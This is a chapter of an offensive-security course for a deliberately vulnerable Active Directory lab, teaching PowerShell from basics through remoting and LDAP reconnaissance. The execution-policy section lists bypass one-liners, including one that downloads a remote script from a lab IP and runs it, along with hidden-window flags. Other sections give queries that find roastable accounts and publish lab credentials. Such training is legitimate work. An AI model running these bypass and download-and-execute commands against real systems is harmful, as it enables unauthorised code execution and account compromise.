# 03 — PowerShell: From `Write-Host` to PowerView

PowerShell is the language of Windows administration and the language of Windows offense. Every modern AD attack tool either *is* PowerShell, wraps PowerShell, or talks to APIs that PowerShell uses. This chapter takes you from "what's a cmdlet" to running PowerView against DVAD, with everything in between.

We assume you've never touched PowerShell. If you know it well: skim §3.0–§3.5, jump to §3.10 onward.

> Reminder: DVAD is intentionally vulnerable. Run only on a network you own. Treat the VMs as hostile. The lab password and configs are public; do not reuse them anywhere else.

---

## 3.0 What PowerShell *is* (and isn't)

- **It is:** a shell, a scripting language, and an automation framework, hosted on **.NET**. The host (`powershell.exe` or `pwsh.exe`) is a thin wrapper around `System.Management.Automation.dll`.
- **It is not:** bash with different syntax. The fundamental difference is that the pipeline carries **objects**, not bytes.

In bash:

```
$ ps -ef | grep lsass | awk '{print $2}'
```

That produces text. You parse with `awk`, `sed`, `cut`, regex. If the formatting changes, your pipeline breaks.

In PowerShell:

```
PS> Get-Process | Where-Object { $_.Name -eq 'lsass' } | Select-Object Id
```

`Get-Process` emits `System.Diagnostics.Process` *objects* with properties (`.Id`, `.Handles`, `.StartTime`, `.MainModule`) and methods (`.Kill()`, `.WaitForExit()`). The pipeline ships those objects unchanged. `Where-Object` filters them. `Select-Object` chooses fields. No string parsing. No regex.

This shift — pipeline-of-objects — is *the* mental change. Once it clicks, PowerShell becomes vastly more powerful than bash for the kind of work AD attackers do, because:

1. AD itself is object-oriented (every user, group, GPO is an LDAP object). PowerShell shows you those objects directly.
2. WMI/CIM is object-oriented. PowerShell speaks it natively.
3. .NET is the API for all of Windows. PowerShell *is* .NET, so any Win32/.NET API is one line away.
4. Remote calls return objects, so cross-host queries compose like local ones.

### A 10-second feel for the difference

```
# bash style
PS> Get-Service | findstr Running           # ← still works but text-only

# powershell style
PS> Get-Service | Where-Object Status -eq Running | Sort-Object DisplayName | Format-Table -AutoSize
```

The second version is filtered by **value of the `Status` property**, not by string match. Status is an enum (`Running`/`Stopped`/`Paused`/...). You're not parsing — you're querying.

---

## 3.1 Starting, running, hosting environments

Windows 10+ / Server 2016+ ship with two PowerShells side by side:

- `powershell.exe` — **Windows PowerShell 5.1** (preinstalled, legacy, .NET Framework). The version every DVAD target uses by default.
- `pwsh.exe` — **PowerShell 7+** (separate install, cross-platform, .NET 6/7/8). Not on DVAD lab hosts.

Versions matter because:

- Some cmdlets only exist in 5.1 (e.g., `Get-WmiObject`).
- Some only exist in 7+ (`ConvertFrom-Json -AsHashtable`, parallel `ForEach-Object -Parallel`).
- Constrained Language Mode behaviour differs.
- The PowerShell **engine version 2** is officially removed in 5.1+, but `powershell.exe -Version 2` could downgrade to a no-AMSI, no-script-block-logging engine on older boxes. Hardened hosts uninstall the v2 engine.

Check your version:

```
PS> $PSVersionTable

Name                           Value
----                           -----
PSVersion                      5.1.20348.2700
PSEdition                      Desktop
PSCompatibleVersions           {1.0, 2.0, 3.0, 4.0...}
BuildVersion                   10.0.20348.2700
CLRVersion                     4.0.30319.42000
WSManStackVersion              3.0
PSRemotingProtocolVersion      2.3
SerializationVersion           1.1.0.1
```

### Hosts

A *host* is the application running PowerShell. Different hosts have different capabilities:

- **ConsoleHost** — `powershell.exe` in a console window. Cursor, color, screen buffer.
- **ServerRemoteHost** — what runs when you `Invoke-Command`/`Enter-PSSession`/`evil-winrm`. **No window**. No `Write-Host` color in some configs. No interactive credentials prompt (must pass `-Credential`).
- **PowerShell ISE** (legacy IDE, deprecated, still present on 2022).
- **Studio hosts** — Visual Studio Code's terminal, Windows Terminal, etc.

Check yours:

```
PS> $Host.Name           # 'ConsoleHost' or 'ServerRemoteHost' or 'Windows PowerShell ISE Host'
PS> $Host.UI.RawUI.WindowSize   # null in remote hosts (no window)
```

This matters: a script that calls `Read-Host` will hang an `Invoke-Command` session. A script that calls `Get-Credential` will *also* hang remotely.

### Providers and PSDrives

PowerShell has a *provider* model: each provider exposes a tree as if it were a filesystem. The default providers:

| PSDrive | Provider | Tree |
|---|---|---|
| `C:` | FileSystem | `C:\…` |
| `HKLM:` | Registry | `HKEY_LOCAL_MACHINE\…` |
| `HKCU:` | Registry | `HKEY_CURRENT_USER\…` |
| `Env:` | Environment | env vars |
| `Function:` | Function | defined functions |
| `Variable:` | Variable | session variables |
| `Alias:` | Alias | aliases |
| `Cert:` | Certificate | local cert stores |
| `WSMan:` | WSMan config | WinRM config tree |
| `AD:` | AD (if RSAT loaded) | LDAP tree |

You can `cd HKLM:`, `Get-ChildItem`, `Get-ItemProperty .`, just like a filesystem. Custom providers exist (IIS, SQLServer module).

```
PS> cd HKLM:\Software\Microsoft\Windows\CurrentVersion\Run
PS HKLM:\…\Run> Get-ItemProperty .

(default)             : 
SecurityHealth        : C:\Windows\system32\SecurityHealthSystray.exe
VBoxClient            : "C:\Windows\System32\VBoxClient.exe" --startup

PS HKLM:\…\Run> Get-ChildItem -Path Env:USERPROFILE
PS HKLM:\…\Run> Set-Location C:\
```

For DVAD, this is huge: registry recon and modification (e.g., reading `FullSecureChannelProtection`, writing autorun keys) is the same syntax as file I/O.

---

## 3.2 Cmdlets, aliases, parameters

A **cmdlet** is a verb-noun command: `Get-Process`, `Set-Service`, `New-Item`, `Remove-Item`, `Invoke-Command`, `Test-Path`.

```
PS> Get-Verb              # list of approved verbs (Get, Set, New, Remove, Test, Start, Stop, ...)
PS> Get-Command Get-*     # all Get-* commands
PS> Get-Command -Module ActiveDirectory  # only AD module cmdlets
PS> Get-Help Get-Process -Full | more   # full help (you may need Update-Help first)
```

### The approved verbs

PowerShell encourages a small set of verbs. Recognise them so you can guess cmdlet names. The big ones:

- **Common:** Add, Clear, Close, Copy, Enter, Exit, Find, Format, Get, Hide, Join, Lock, Move, New, Open, Optimize, Pop, Push, Redo, Remove, Rename, Reset, Resize, Search, Select, Set, Show, Skip, Split, Step, Switch, Undo, Unlock, Watch
- **Data:** Backup, Checkpoint, Compare, Compress, Convert, ConvertFrom, ConvertTo, Dismount, Edit, Expand, Export, Group, Import, Initialize, Limit, Merge, Mount, Out, Publish, Restore, Save, Sync, Unpublish, Update
- **Lifecycle:** Approve, Assert, Build, Complete, Confirm, Deny, Deploy, Disable, Enable, Install, Invoke, Register, Request, Restart, Resume, Start, Stop, Submit, Suspend, Uninstall, Unregister, Wait
- **Diagnostic:** Debug, Measure, Ping, Repair, Resolve, Test, Trace
- **Communications:** Connect, Disconnect, Read, Receive, Send, Write
- **Security:** Block, Grant, Protect, Revoke, Unblock, Unprotect

When you see `Find-LocalAdminAccess` you can guess: "Find" → diagnostic verb → "returns matches." When you see `Invoke-DCSync` you can guess: "Invoke" → lifecycle → "runs an action."

### Aliases

Aliases shortcut common cmdlets. Some are POSIX-compatible to ease the transition from Unix:

| Alias | Cmdlet | POSIX-style? |
|---|---|---|
| `ls`, `dir`, `gci` | `Get-ChildItem` | yes |
| `cd`, `sl` | `Set-Location` | yes |
| `cp`, `copy` | `Copy-Item` | yes |
| `rm`, `del`, `ri` | `Remove-Item` | yes |
| `mv`, `move`, `mi` | `Move-Item` | yes |
| `cat`, `type` | `Get-Content` | yes |
| `pwd` | `Get-Location` | yes |
| `echo` | `Write-Output` | yes |
| `kill` | `Stop-Process` | yes |
| `man`, `help` | `Get-Help` | yes |
| `?`, `where` | `Where-Object` | — |
| `%`, `foreach` | `ForEach-Object` | — |
| `select` | `Select-Object` | — |
| `sort` | `Sort-Object` | — |
| `gm` | `Get-Member` | — |
| `iex` | `Invoke-Expression` | — |
| `icm` | `Invoke-Command` | — |
| `iwr`, `curl`, `wget` | `Invoke-WebRequest` | yes |
| `irm` | `Invoke-RestMethod` | — |
| `gwmi` | `Get-WmiObject` (5.1 only) | — |
| `gcim` | `Get-CimInstance` | — |
| `gps`, `ps` | `Get-Process` | yes |
| `gsv` | `Get-Service` | — |
| `gp` | `Get-ItemProperty` | — |
| `sp` | `Set-ItemProperty` | — |
| `sv` | `Set-Variable` | — |
| `gv` | `Get-Variable` | — |

`Get-Alias` lists them all. `Get-Alias iex` → `Invoke-Expression`.

### Parameters

Cmdlets take **named long-form** parameters: `-Name`, `-Path`, `-Filter`, `-ComputerName`. Tab-completion works:

```
PS> Get-Process -Na<TAB>          # autocompletes to -Name
```

Positional parameters work for the most-used first parameter:

```
PS> Get-Process notepad           # notepad goes to -Name positionally
PS> Get-Process -Name notepad     # equivalent
```

Switches are flag-style (no value):

```
PS> Get-ChildItem -Recurse -Force
```

Common parameters (work on most cmdlets):

```
-Verbose          # show extra output
-Debug            # break to debugger on actions
-WhatIf           # don't actually do it, print what would happen
-Confirm          # prompt before each action
-ErrorAction      # SilentlyContinue, Stop, Continue, Inquire
-ErrorVariable    # name of variable to store errors
-OutVariable      # store output in a variable too
-PipelineVariable # name for the current pipeline item
```

`-WhatIf` is great for destructive cmdlets:

```
PS> Remove-Item C:\Important\* -Recurse -WhatIf
What if: Performing the operation "Remove File" on target "C:\Important\file1.txt".
What if: Performing the operation "Remove File" on target "C:\Important\file2.txt".
```

---

## 3.3 Variables, types, the pipeline

### Variables

`$name = "alice"` — sigil `$` for variables. Untyped by default; you can pin a type:

```
[int]$n = 42
[string]$s = "hello"
[datetime]$now = Get-Date
[guid]$g = [guid]::NewGuid()
[byte[]]$bytes = 1,2,3,4
[hashtable]$h = @{a=1; b=2}
```

Special variables you'll meet constantly:

| Var | What |
|---|---|
| `$_` | Current pipeline object (inside `Where-Object`/`ForEach-Object`) |
| `$PSItem` | Same as `$_`, explicit name |
| `$null` | Null sentinel |
| `$true`, `$false` | Booleans |
| `$env:USERNAME` | Environment variable lookup |
| `$args` | Positional args inside a function/script (no `param` block) |
| `$?` | True if last command succeeded |
| `$LASTEXITCODE` | Exit code of the most recent external command |
| `$PSVersionTable` | Version info object |
| `$Host` | Host info |
| `$Error` | Array of recent errors (newest first) |
| `$ErrorActionPreference` | Continue / Stop / SilentlyContinue / Inquire |
| `$VerbosePreference`, `$DebugPreference` | Same idea |
| `$PSDefaultParameterValues` | Per-cmdlet default param values |
| `$MyInvocation` | Info about the current script/function call |
| `$PSScriptRoot` | Directory of the running script |
| `$pid` | Current process ID |
| `$home` | User home dir |
| `$pwd` | Current location object |

### Scopes

PowerShell has *scopes*: Global, Script, Local, Private, plus numerically-named parent scopes (`$script:`, `$global:`, `$local:`, `$private:`).

```
$global:Secret = "xyz"        # accessible everywhere
$script:Cache = @{}           # script-scoped (within a .ps1)
function Foo {
    $local:tmp = 1
    "$tmp"                    # 1
}
"$tmp"                        # error: variable not in scope
```

`$using:` is a special prefix used to capture a parent variable into a remote scriptblock:

```
$user = "alice"
Invoke-Command -ComputerName dc01 -ScriptBlock { Get-ADUser $using:user }
```

Without `$using:`, the scriptblock has no access to `$user` from the calling session.

### Operators

```
-eq  -ne  -lt  -le  -gt  -ge       # comparison (NOT ==, !=, <, etc.)
-ieq -ilt -...                       # case-insensitive (default)
-ceq -clt -...                       # case-sensitive
-and -or  -not -xor                  # logical
-band -bor -bnot -bxor               # bitwise
-like  '*.txt'                       # wildcard match
-notlike
-match 'regex'                       # regex match (sets $matches)
-notmatch
-contains -notcontains -in -notin    # collection membership
-replace 'old','new'                 # regex replace
-split 'delim'                       # string split
-join ','                            # string/array join
-is [Type]                           # type test
-as [Type]                           # type coercion (returns $null on failure)
+ - * / %                            # arithmetic
+= -= *= /= ++ --
```

Comparisons are **case-insensitive by default**. Prefix `c` for case-sensitive (`-ceq`, `-cmatch`).

Comparison gotcha:

```
PS> 0 -eq $null     # False
PS> $null -eq 0     # False
PS> @() -eq $null   # nothing! (empty array compared element-wise)
```

Always put `$null` on the left when testing nullability:

```
if ($null -eq $x) { ... }
```

### Type system

PowerShell automatically converts types in many contexts ("PowerShell will try to do what you mean"). Sometimes this surprises you:

```
PS> "5" + 3               # "53" (string + int → string)
PS> 5 + "3"               # 8 (int + string → int)
PS> [int]"3.7"            # 4 (rounded, banker's rounding actually)
PS> [int]"abc"            # error
```

Cast explicitly when ambiguity hurts. `[int]`, `[long]`, `[double]`, `[bool]`, `[string]`, `[char]`, `[byte]`, `[datetime]`, `[guid]`, `[ipaddress]`, `[uri]`, `[xml]`, `[scriptblock]`, `[array]`, `[hashtable]`, `[ordered]` — all in the global type accelerator table. `[System.Net.IPEndPoint]` works too — any .NET type by name.

### The pipeline

```
Get-ChildItem C:\Windows -Recurse -ErrorAction SilentlyContinue |
    Where-Object { $_.Length -gt 100MB } |
    Sort-Object Length -Descending |
    Select-Object FullName, @{N='SizeMB'; E={[math]::Round($_.Length/1MB,1)}} -First 10
```

Read top-to-bottom:
1. List all files under `C:\Windows`, suppressing errors (denied paths).
2. Keep files larger than 100 MB.
3. Sort by size descending.
4. Project two columns: `FullName` and a computed `SizeMB`, top 10.

The `@{N='SizeMB'; E={…}}` syntax is a **calculated property** — `N` is the column name, `E` is the expression. You'll use this often.

### Two iteration idioms

```
$items | ForEach-Object { Process-It $_ }     # streaming (lazy, one at a time)
foreach ($i in $items) { Process-It $i }      # loop (eager, materializes the whole collection)
```

`ForEach-Object` accepts pipeline input and streams. `foreach` is a statement, faster for in-memory collections.

### Suppress, capture, redirect

```
$null = Some-Cmdlet           # swallow output
Some-Cmdlet | Out-Null        # also swallow
Some-Cmdlet > out.txt         # file redirect (text)
Some-Cmdlet 2> err.txt        # stderr redirect
Some-Cmdlet *> all.txt        # everything
Some-Cmdlet 2>&1              # merge stderr into stdout
```

PowerShell has multiple streams: 1 success, 2 error, 3 warning, 4 verbose, 5 debug, 6 information.

---

## 3.4 Strings — quoting, interpolation, here-strings

**Double quotes** interpolate variables:

```
PS> $name = "alice"
PS> "Hello, $name"               # Hello, alice
PS> "User: $($obj.Name)"         # subexpression
PS> "Path: $env:USERPROFILE"
```

**Single quotes** are literal:

```
PS> '$name is not expanded'      # $name is not expanded
```

Backtick is the line-continuation and escape char:

```
PS> "line one`nline two"         # `n = newline
PS> "tab`there"                  # `t = tab
PS> "she said `"hi`""            # `" = embedded double quote
PS> "literal backtick: ``"
PS> Get-ChildItem -Path `
        C:\Windows `
        -Recurse                  # line-continuation
```

Use sparingly — splatting is often cleaner than backtick line continuation (see §3.6).

Here-strings for multi-line:

```
$msg = @"
This is multi-line.
Interpolation works: $name.
"$"@                              # closing tag must be at column 0
```

Single-quoted here-string for literal multi-line content:

```
$ps1 = @'
$secret = "DVADlab2024!"
Get-ADUser -Filter * 
'@
```

### String formatting

Three ways:

```
"User {0} has {1} groups" -f $u.Name, $u.Groups.Count
$($u.Name): $($u.Groups.Count) groups        # inline interpolation
[string]::Format("{0,-20} {1,10}", $u.Name, $u.Id)    # .NET style
```

The `-f` operator follows .NET's composite formatting. `{0:N2}` for 2 decimals, `{0:D5}` for zero-padded decimal, `{0:X8}` for hex, `{0:yyyy-MM-dd}` for date.

### Regex

PowerShell's `-match` / `-replace` use .NET regex (`System.Text.RegularExpressions.Regex`):

```
PS> "alice@corp.local" -match '(?<u>[^@]+)@(?<d>.+)'
True
PS> $matches.u
alice
PS> $matches.d
corp.local

PS> "abc123" -replace '(\D+)(\d+)','$2-$1'
123-abc

PS> [regex]::Matches("admin1,user2,svc3","(\w+?)(\d+)") |
       ForEach-Object { [pscustomobject]@{ Name = $_.Groups[1].Value; Num = $_.Groups[2].Value } }
```

`(?<name>…)` is a named capture group. `[regex]::Escape` to safely escape an input string.

---

## 3.5 Arrays, hashtables, ordered hashtables, custom objects

### Arrays

```
$arr = 1,2,3,4,5                 # comma operator creates an array
$arr = @(1,2,3,4,5)              # explicit syntax (same result)
$arr = @()                       # empty array
$single = ,5                     # single-element array (without comma it's just int 5)
$arr[0]                          # 1
$arr[-1]                         # 5
$arr[1..3]                       # 2 3 4 (range)
$arr.Length
$arr += 6                        # creates a new array (PS arrays are immutable size)
$arr -contains 3                 # True
3 -in $arr                       # True (PS3+)
```

For *append-heavy* workflows, use `[System.Collections.Generic.List[Type]]` or `[System.Collections.ArrayList]`:

```
$list = [System.Collections.Generic.List[object]]::new()
$list.Add($x)
$list.AddRange(@($y, $z))
```

`+=` on a real array is O(n) per append (copies the whole array). With 100k items, it's painfully slow.

### Hashtables

```
$h = @{ Name = "alice"; Id = 42; Groups = @("admins","users") }
$h.Name; $h["Id"]
$h.Keys; $h.Values
$h.ContainsKey("Name")
$h.Remove("Id")
$h["new"] = "value"
foreach ($k in $h.Keys) { "$k => $($h[$k])" }
```

Hashtables are unordered by default. Use `[ordered]` to preserve insertion order:

```
$ord = [ordered]@{ first = 1; second = 2; third = 3 }
```

`[ordered]` is critical when converting to JSON or output where field order matters.

### PSCustomObject

The idiomatic record type:

```
$user = [pscustomobject]@{
    Name = "alice"
    Sid  = "S-1-5-21-...-1109"
    Groups = @("Domain Users","Authenticated Users")
}
$user.Name
$user | Format-Table
$user | ConvertTo-Json
$user | Export-Csv -NoTypeInformation users.csv
```

`PSCustomObject` is *the* lingua franca for cross-cmdlet output. Tools like BloodHound's PowerShell ingestor emit them, you filter with `Where-Object`, pipe to `Export-Csv`, done.

### Type accelerators

`[pscustomobject]` is one of many *type accelerators* — short names for full .NET type names. Useful ones:

| Accelerator | Full type |
|---|---|
| `[psobject]` | `System.Management.Automation.PSObject` |
| `[pscustomobject]` | `System.Management.Automation.PSCustomObject` |
| `[pscredential]` | `System.Management.Automation.PSCredential` |
| `[hashtable]` | `System.Collections.Hashtable` |
| `[ordered]` | `System.Collections.Specialized.OrderedDictionary` |
| `[scriptblock]` | `System.Management.Automation.ScriptBlock` |
| `[xml]` | `System.Xml.XmlDocument` |
| `[regex]` | `System.Text.RegularExpressions.Regex` |
| `[wmi]` | `System.Management.ManagementObject` |
| `[wmiclass]` | `System.Management.ManagementClass` |
| `[adsi]` | `System.DirectoryServices.DirectoryEntry` |
| `[adsisearcher]` | `System.DirectoryServices.DirectorySearcher` |

`[adsisearcher]` is the one you use to do raw LDAP queries with no module dependency — covered in §3.10.

---

## 3.6 Functions, scriptblocks, splatting

### Basic function

```
function Greet {
    param([string]$Name = "world")
    "Hello, $Name"
}
Greet -Name alice              # Hello, alice
```

### Advanced function (cmdlet-style)

```
function Get-CompromisedUser {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory, ValueFromPipeline)]
        [string]$Identity,

        [Parameter()]
        [string]$Server = "dc01.corp.local",

        [Parameter()]
        [int]$Timeout = 30
    )
    begin   { Write-Verbose "Starting" }
    process { Get-ADUser -Identity $Identity -Server $Server }
    end     { Write-Verbose "Done" }
}

"alice","bob" | Get-CompromisedUser -Verbose
```

`[CmdletBinding()]` unlocks `-Verbose`, `-Debug`, `-ErrorAction`, and the `$PSCmdlet` automatic variable. `begin/process/end` blocks let your function stream pipeline input.

### Scriptblocks

A scriptblock literal: `{ ... }`. Invoke with `&` (call) or `Invoke()`:

```
$sb = { param($x) $x * 2 }
& $sb 21         # 42
$sb.Invoke(21)   # 42
```

`Where-Object` and `ForEach-Object` take a scriptblock; inside it, `$_` is the current item.

```
1..10 | Where-Object { $_ % 2 -eq 0 } | ForEach-Object { $_ * $_ }
# 4 16 36 64 100
```

### Splatting

Splatting passes a hashtable as named arguments — cleaner than long parameter lists:

```
$params = @{
    Path           = "C:\Logs"
    Recurse        = $true
    Filter         = "*.log"
    ErrorAction    = "SilentlyContinue"
}
Get-ChildItem @params
```

`@params` (note the `@`, not `$`) splats. Splatting works for any cmdlet and is the readability win that beats backtick line continuation.

Array splatting is for positional args:

```
$args = "10.10.0.10", 445
Test-NetConnection @args        # equivalent to Test-NetConnection 10.10.0.10 445
```

---

## 3.7 Help, exploration, `Get-Member`

`Get-Member` (`gm`) is the most important diagnostic cmdlet. It tells you the *type* and *members* of any object:

```
PS> Get-Process | Get-Member

   TypeName: System.Diagnostics.Process

Name                       MemberType     Definition
----                       ----------     ----------
Handles                    AliasProperty  Handles = HandleCount
Name                       AliasProperty  Name = ProcessName
NPM                        AliasProperty  NPM = NonpagedSystemMemorySize64
PM                         AliasProperty  PM = PagedMemorySize64
SI                         AliasProperty  SI = SessionId
VM                         AliasProperty  VM = VirtualMemorySize64
WS                         AliasProperty  WS = WorkingSet64
Disposed                   Event          System.EventHandler Disposed(System.Object, ...
Kill                       Method         void Kill(), void Kill(bool entireProcessTree)
WaitForExit                Method         void WaitForExit(), bool WaitForExit(int millisec...
BasePriority               Property       int BasePriority {get;}
HandleCount                Property       int HandleCount {get;}
Id                         Property       int Id {get;}
ProcessName                Property       string ProcessName {get;}
StartTime                  Property       datetime StartTime {get;}
...
```

When you don't know what's on an object: `$x | gm`. When you don't know the type: `$x.GetType()`. When you need help on a cmdlet: `Get-Help <cmdlet> -Full` (or `-Examples`).

`about_*` topics are the language reference:

```
PS> Get-Help about_Pipelines
PS> Get-Help about_Comparison_Operators
PS> Get-Help about_Functions_Advanced
PS> Get-Help about_Splatting
PS> Get-Help about_Logical_Operators
```

You may need `Update-Help` once before help files exist locally. On lab hosts without internet, `Get-Help` shows the auto-generated synopsis only — enough to discover parameters, not enough to explain semantics.

`Get-Command` (`gcm`) finds cmdlets:

```
PS> Get-Command *AD*                 # all AD-named cmdlets
PS> Get-Command -Module ActiveDirectory
PS> Get-Command -Verb Get -Noun User
```

---

## 3.8 Execution policy and bypasses

Out of the box, Windows blocks running unsigned scripts:

```
PS> .\evil.ps1
.\evil.ps1 : File C:\…\evil.ps1 cannot be loaded because running scripts is disabled on this system.
```

Execution policy is set per-scope (MachinePolicy > UserPolicy > Process > CurrentUser > LocalMachine):

```
PS> Get-ExecutionPolicy -List
PS> Get-ExecutionPolicy
```

Values: `Restricted`, `AllSigned`, `RemoteSigned` (default on servers — Internet-zone scripts must be signed), `Unrestricted`, `Bypass`.

**Execution policy is a soft restriction, not a security boundary.** Microsoft has stated this repeatedly. All of these bypass it:

```
powershell.exe -ExecutionPolicy Bypass -File evil.ps1
powershell.exe -ep bypass -c "iex (irm http://10.10.0.1/x.ps1)"
Get-Content evil.ps1 | iex
[System.IO.File]::ReadAllText("evil.ps1") | iex
Set-ExecutionPolicy Bypass -Scope Process       # per-session
powershell.exe -EncodedCommand <base64-utf16le-of-the-script>
powershell.exe -nop -w hidden -ep bypass -c "..."
```

The `-nop` (no profile), `-w hidden`, `-nologo`, `-noni` (non-interactive) flags are common in attacker invocations.

Defenders detect these via 4688 process creation with command line capture, or PowerShell 4104 script-block logging. We'll wire that up in chapter 13.

---

## 3.9 Remoting — WS-Management (WinRM) and PSSession

Two cmdlets that change your life:

```
PS> Invoke-Command -ComputerName dc01 -ScriptBlock { hostname; whoami }
PS> Enter-PSSession -ComputerName dc01      # interactive remote shell
```

These use **WS-Management (WinRM)** — HTTP on 5985, HTTPS on 5986. Same protocol Ansible and `evil-winrm` use. The endpoint on the server is implemented by `WinRM` service hosting PowerShell as a SOAP/PSRP shell.

### Credentials

```
$cred = Get-Credential                                       # prompts (interactive only)
$sec  = ConvertTo-SecureString 'DVADlab2024!' -AsPlainText -Force
$cred = New-Object PSCredential('corp\alice', $sec)

Invoke-Command -ComputerName dc01 -Credential $cred -ScriptBlock { whoami }
```

Once you have a session:

```
$s = New-PSSession -ComputerName dc01 -Credential $cred
Invoke-Command -Session $s -ScriptBlock { ... }
Enter-PSSession -Session $s
Remove-PSSession $s
```

Sessions persist state. Repeated `Invoke-Command -ComputerName` reconnects each time; `-Session` reuses.

### Authentication mechanisms

WinRM supports:

- **Kerberos** (default for domain) — works when client and server share a domain or have a trust.
- **NTLM** — fallback for non-domain or IP-addressed targets. evil-winrm uses NTLM by default.
- **CredSSP** — delegates credentials to the server (allows the server to re-use your creds outward). Solves the "double-hop" problem (next section). Insecure; off by default.
- **Certificate** — client cert auth (rare).
- **Basic** — HTTP Basic over HTTPS (rare in domain).

### The double-hop problem

You connect to `dc01` over WinRM. From inside that session, you try to access `\\file01\share`. It fails: "Access denied," even though your domain creds are valid.

**Why:** by default, your creds reach `dc01` but `dc01` is not allowed to re-authenticate to another machine on your behalf — that would be delegation, and only Kerberos delegation (constrained or unconstrained) allows it. NTLM has no delegation. Default WinRM does not enable CredSSP.

**Fixes:**

- **CredSSP** — `Enable-WSManCredSSP -Role Client -DelegateComputer dc01` on your box and `-Role Server` on dc01. Then `Invoke-Command -Authentication CredSSP -Credential $cred`. Server now has your plaintext credentials in memory, which is the security cost.
- **Kerberos delegation** — set up Resource-Based Constrained Delegation (RBCD) or unconstrained delegation on dc01. Production-clean.
- **Use a Kerberos ticket** — if you have a valid TGT and it's flagged forwardable, you can S4U2Self/S4U2Proxy via tools. Beyond chapter 3 scope.
- **Pass plaintext credentials inside the scriptblock** — `Invoke-Command -ComputerName dc01 { net use \\file01\share /user:corp\alice DVADlab2024! }`. Works but echoes creds; loud.

In DVAD, several lateral paths run into the double-hop. When they do, the lab usually has unconstrained delegation on a member server to abuse (DF-006 / LAT-018 territory).

### Configuration trivia

```
PS> Test-WSMan -ComputerName dc01
PS> winrm enumerate winrm/config/listener
PS> Get-Item WSMan:\localhost\Client\TrustedHosts
PS> Set-Item WSMan:\localhost\Client\TrustedHosts -Value '*' -Force
```

`TrustedHosts` is a *client-side* setting that says "trust these servers' identity when using NTLM/Basic." From your attacker box (Kali running evil-winrm) you don't touch this; you do it on Windows attack boxes.

### Running scripts on many hosts

```
$targets = "ws01","sql01","file01"
Invoke-Command -ComputerName $targets -Credential $cred -ScriptBlock {
    Get-CimInstance Win32_OperatingSystem | Select-Object PSComputerName, Caption, BuildNumber
} -ThrottleLimit 10
```

`-ThrottleLimit` controls parallelism (default 32). `PSComputerName` is auto-added so you know which host returned which result.

---

## 3.10 LDAP and AD from PowerShell

Two paths to AD from PowerShell:

1. **`ActiveDirectory` module** (RSAT, Microsoft-blessed, friendly).
2. **Raw LDAP via `[adsisearcher]`** (no dependency, works on locked-down hosts).

PowerView (next section) uses approach 2 internally.

### The AD module

Auto-available on DCs and member servers with `RSAT-AD-PowerShell` installed:

```
PS> Import-Module ActiveDirectory
PS> Get-ADDomain
PS> Get-ADForest
PS> Get-ADUser -Identity alice -Properties *
PS> Get-ADUser -Filter * | Select-Object SamAccountName, Enabled
PS> Get-ADGroup -Identity "Domain Admins"
PS> Get-ADGroupMember "Domain Admins" -Recursive
PS> Get-ADComputer -Filter * -Properties OperatingSystem, LastLogonDate
PS> Get-ADObject -Filter 'objectClass -eq "user"' -SearchBase "OU=ServiceAccounts,DC=corp,DC=local"
PS> Get-ADTrust -Filter *
```

`Get-ADUser -Filter` uses *PowerShell* expression syntax (`-eq`, `-and`, etc.), then translates to LDAP. `-LDAPFilter` lets you pass raw LDAP:

```
PS> Get-ADUser -LDAPFilter '(servicePrincipalName=*)' -Properties servicePrincipalName
PS> Get-ADUser -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=4194304)' -Properties userAccountControl
```

The first lists kerberoastable users. The second lists `DONT_REQ_PREAUTH` users (AS-REP roastable). The `1.2.840.113556.1.4.803` OID is the **LDAP_MATCHING_RULE_BIT_AND** rule — see §3.10b.

### Raw LDAP via `[adsisearcher]`

When the AD module isn't loaded (or you can't load it), `[adsisearcher]` is built into .NET:

```
PS> $s = [adsisearcher]"(servicePrincipalName=*)"
PS> $s.PageSize = 1000
PS> $s.PropertiesToLoad.Add('samaccountname') | Out-Null
PS> $s.PropertiesToLoad.Add('serviceprincipalname') | Out-Null
PS> $s.FindAll() | ForEach-Object {
        [pscustomobject]@{
            Name = $_.Properties.samaccountname[0]
            SPNs = ($_.Properties.serviceprincipalname -join ', ')
        }
    }
```

The connection uses the current user's Kerberos context against the closest DC. To target a specific server or use alt credentials:

```
PS> $root = [adsi]"LDAP://10.10.0.10/DC=corp,DC=local"
PS> $root.Path
PS> $s = [adsisearcher]::new($root, "(samaccountname=alice)")
PS> $s.FindOne().Properties

# With alternate credentials:
PS> $de = New-Object System.DirectoryServices.DirectoryEntry "LDAP://10.10.0.10/DC=corp,DC=local","corp\alice","DVADlab2024!"
PS> $s = [adsisearcher]::new($de, "(samaccountname=alice)")
```

The Kali equivalent is `ldapsearch -H ldap://10.10.0.10 -D 'CORP\alice' -w '…' -b 'DC=corp,DC=local' '(samaccountname=alice)'`.

### LDAP filter syntax (mirror to chapter 04)

```
(objectClass=user)
(&(objectClass=user)(objectCategory=person))
(|(samaccountname=alice)(samaccountname=bob))
(!(objectClass=group))
(memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=local)
(&(objectClass=user)(servicePrincipalName=*))
(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))
(&(objectClass=computer)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))
(&(objectClass=user)(adminCount=1))
(objectClass=msDS-GroupManagedServiceAccount)
```

| OID | Rule | Use |
|---|---|---|
| `1.2.840.113556.1.4.803` | LDAP_MATCHING_RULE_BIT_AND | "this UAC bit is set" |
| `1.2.840.113556.1.4.804` | LDAP_MATCHING_RULE_BIT_OR | "any of these bits is set" |
| `1.2.840.113556.1.4.1941` | LDAP_MATCHING_RULE_IN_CHAIN | transitive group membership |

The 1941 rule is gold:

```
(memberOf:1.2.840.113556.1.4.1941:=CN=Domain Admins,CN=Users,DC=corp,DC=local)
```

That returns *everyone in Domain Admins through any nesting depth*. Without 1941, you'd need to traverse manually.

### UAC bit values you'll see often

| Bit (decimal) | Bit (hex) | UAC flag |
|---|---|---|
| 2 | 0x2 | Account disabled |
| 16 | 0x10 | Account locked out |
| 32 | 0x20 | Password not required |
| 64 | 0x40 | Password cannot change |
| 512 | 0x200 | Normal account |
| 4096 | 0x1000 | Workstation trust account |
| 8192 | 0x2000 | Server trust account |
| 65536 | 0x10000 | Password never expires |
| 524288 | 0x80000 | Trusted for delegation (unconstrained) |
| 1048576 | 0x100000 | Not delegated (sensitive) |
| 2097152 | 0x200000 | Use DES key only |
| 4194304 | 0x400000 | **DoNotRequirePreAuth** (AS-REP roast) |
